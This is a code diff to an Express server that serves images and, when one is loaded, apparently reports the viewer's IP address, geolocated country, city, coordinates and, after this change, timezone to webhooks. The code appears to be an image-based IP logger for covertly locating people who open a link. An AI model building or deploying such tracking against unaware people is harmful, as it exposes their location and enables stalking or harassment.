@@ -58,6 +58,7 @@ const sendImageToWebhooks = (
   imageName,
   imageUrl,
   clientIP,
+  timezone,
   country,
   city,
   ll
@@ -77,7 +78,11 @@ const sendImageToWebhooks = (
         },
         {
           name: '📡 Network',
-          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n🌍 Country: ${country}\n🏙️ City: ${city}\n📍 Coordinates: ${ll}\`\`\``
+          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${
+            timezone || 'not found'
+          }\n🌍 Country: ${country || 'not found'}\n🏙️ City: ${
+            city || 'not found'
+          }\n📍 Coordinates: ${ll || 'not found'}\`\`\``
         }
       ])
       .setThumbnail(`attachment://${imageName}`)
@@ -185,8 +190,11 @@ app.get('/image/:imageName', (req, res) => {
 
       // Get client's information
       const ipInfo = geoip.lookup(clientIP)
-      let { country, city, ll } = ipInfo
+      let { timezone, country, city, ll } = ipInfo
 
+      if (!timezone) {
+        timezone = 'not found'
+      }
       if (!country) {
         country = 'not found'
       }
@@ -202,7 +210,15 @@ app.get('/image/:imageName', (req, res) => {
       )
 
       // Send the image to the webhooks
-      sendImageToWebhooks(imageName, imageUrl, clientIP, country, city, ll)
+      sendImageToWebhooks(
+        imageName,
+        imageUrl,
+        clientIP,
+        timezone,
+        country,
+        city,
+        ll
+      )
     } catch (error) {
       logger.error(`Error sending image to webhooks: ${error}`)
     }
